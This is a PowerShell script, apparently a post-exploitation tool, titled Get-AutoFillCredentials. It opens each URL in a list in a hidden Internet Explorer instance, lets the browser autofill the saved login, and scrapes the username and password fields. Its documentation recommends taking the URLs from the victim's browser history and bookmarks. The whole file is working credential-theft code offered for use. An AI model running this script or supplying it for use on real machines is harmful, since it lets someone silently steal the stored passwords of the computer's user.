Function Browse-Url {
    <#
    .SYNOPSIS
        Helper function that instantiates an IE COM object and returns the IE object.
        Not intended to be called by itself. Called from Get-AutoFillCredentials.
        Author: Jake Miller (@LaconicWolf) 
    .DESCRIPTION
        Instantiates an IE COM object and browses to a specified URL, and then returns the IE object.
    .PARAMETER Urls
        Mandatory parameter that specifies which where the browser navigates.
    .PARAMETER Urls
        Specifies whether or not IE will be visible. Default value is false (not visible)
    #>

    [CmdletBinding()]
    Param(

        [Parameter(Mandatory = $true)]
        $Urls,

        [Parameter(Mandatory = $false)]
        [ValidateSet("True", "False")]
        $Visibility = $false
    )

    if ($Visibility -eq "True") { $Visibility = $true }

    $ie = New-Object -ComObject InternetExplorer.Application.1
    $ie.Visible = $Visibility
    $ie.Silent = $True
    $ie.Navigate($Url)
    while ($ie.Busy) {Start-Sleep -Seconds 1}
    
    return $ie
}


Function Parse-Username {
    <#
    .SYNOPSIS
        Helper function that takes an IE COM object and searches the DOM for username fields.
        Not intended to be called by itself. Called from Get-AutoFillCredentials.
        Author: Jake Miller (@LaconicWolf) 
    .DESCRIPTION
        Takes an IE COM object and searches the DOM for username fields. Returns any usernames found.
    .PARAMETER BrowserObject
        Required so the parsing the username can be accomplished.
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)]
        $BrowserObject
    )

    if ($BrowserObject.Document.getElementById('username')) {
        $username = $BrowserObject.Document.getElementById('username')
    }
    elseif ($BrowserObject.Document.getElementById('user_name')) {
        $username = $BrowserObject.Document.getElementById('user_name')
    }
    elseif ($BrowserObject.Document.getElementById('user_login')) {
        $username = $BrowserObject.Document.getElementById('user_login')
    }
    elseif ($BrowserObject.Document.getElementById('j_username')) {
        $username = $BrowserObject.Document.getElementById('j_username')
    }
    elseif ($BrowserObject.Document.getElementById('email')) {
        $username = $BrowserObject.Document.getElementById('email')
    }
    elseif ($BrowserObject.Document.getElementById('os_username')) {
        $username = $BrowserObject.Document.getElementById('os_username')
    }
    elseif ($BrowserObject.Document.getElementById('halogenLoginID')) {
        $username = $BrowserObject.Document.getElementById('halogenLoginID')
    }
    elseif ($BrowserObject.Document.getElementById('ctl00_cpContent_txtUserName')) {
        $username = $BrowserObject.Document.getElementById('ctl00_cpContent_txtUserName')
    }
    elseif ($BrowserObject.Document.getElementById('add')) {
        $username = $BrowserObject.Document.getElementById('add')
    }

    return $username.Value
}


Function Parse-Password {
    <#
    .SYNOPSIS
        Helper function that takes an IE COM object and searches the DOM for password fields.
        Not intended to be called by itself. Called from Get-AutoFillCredentials.
        Author: Jake Miller (@LaconicWolf) 
    .DESCRIPTION
        Takes an IE COM object and searches the DOM for password fields. Returns any passwords found.
    .PARAMETER BrowserObject
        Required so the parsing the password can be accomplished.
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)]
        $BrowserObject
    )
    if ($BrowserObject.Document.getElementById('password')) {
        $password = $BrowserObject.Document.getElementById('password')
    }
    elseif ($BrowserObject.Document.getElementById('j_password')) {
        $password = $BrowserObject.Document.getElementById('j_password')
    }
    elseif ($BrowserObject.Document.getElementById('user_password')) {
        $password = $BrowserObject.Document.getElementById('user_password')
    }
    elseif ($BrowserObject.Document.getElementById('os_password')) {
        $password = $BrowserObject.Document.getElementById('os_password')
    }
    elseif ($BrowserObject.Document.getElementById('halogenLoginPassword')) {
        $password = $BrowserObject.Document.getElementById('halogenLoginPassword')
    }
    elseif ($BrowserObject.Document.getElementById('ctl00_cpContent_txtPassword')) {
        $password = $BrowserObject.Document.getElementById('ctl00_cpContent_txtPassword')
    }
    elseif ($BrowserObject.Document.getElementById('pin')) {
        $password = $BrowserObject.Document.getElementById('pin')
    }

    return $password.Value
}


Function Get-AutoFillCredentials {
    <#
    .SYNOPSIS
        Takes a file of URLs and browses to them via an invisible IE COM object. Each visited site is scraped for usernames and passwords.
        Author: Jake Miller (@LaconicWolf) 
    .DESCRIPTION
        Takes a file of URLs and browses to them via an invisible IE COM object. Each visited site is scraped for usernames and passwords.
        The functions Parse-Username and Parse-Password edited to search for additional values as required. It is recommended that the file
        of URLs be derived from the user's browser history and favorites/bookmarks. This is not a fast process. You can use -DisplayStatus for
        a running status.
    .PARAMETER URLFile
        Specifies the file containing the list of URLs to browse to.
    .PARAMETER DisplayStatus
        Will provide messages showing you the status of the browsing.
    .EXAMPLE
        PS C:\> Get-AutoFillCredentials -URLFile urls.txt
        Will browse to each URL and attempt to extract the username and password if the HTML field is found.
    .EXAMPLE
        PS C:\> Get-AutoFillCredentials -URLFile urls.txt -DisplayStatus
        Will browse to each URL and attempt to extract the username and password if the HTML field is found.
        Will display the total number of URLs loaded along with which URL is currently being browsed to.
    #>

    [Cmdletbinding()]
    Param(

    [Parameter(Mandatory = $true)]
    $URLFile,

    [Parameter(Mandatory = $false)]
    [switch]
    $Visible,

    [Parameter(Mandatory = $false)]
    [switch]
    $DisplayStatus
    )


    if (-not (Test-Path -Path $URLFile)){
        Write-Verbose "[-] Unable to access $URLFile. Check the path and try again"
        return
    }

    $urls = Get-Content $URLFile
    $totalurls = $urls.Count

    if ($DisplayStatus) {
        Write-Host "Loaded $totalurls URLs for browsing"
    }

    $counter = 1
    foreach($url in $urls) {
        
        if ($DisplayStatus) {
            Write-Host "Browsing $url -  Site $counter of $totalurls"
        }

        if ($Visible) { $Browser = Browse-Url -Url $url -Visibility True }
        else { $Browser = Browse-Url -Url $url }

        # Give the browser a couple seconds to auto-fill the form fields
        Start-Sleep -Seconds 2
        if ($Browser -eq $null) { continue }
        $user = Parse-Username -BrowserObject $Browser
        $pass = Parse-Password -BrowserObject $Browser
        $Browser.Quit()
        $counter += 1

        if ($user -or $pass) {
            New-Object -TypeName PSObject -Property @{
                URL = $url
                Username = $user
                Password = $pass
            }
        }
    }
}
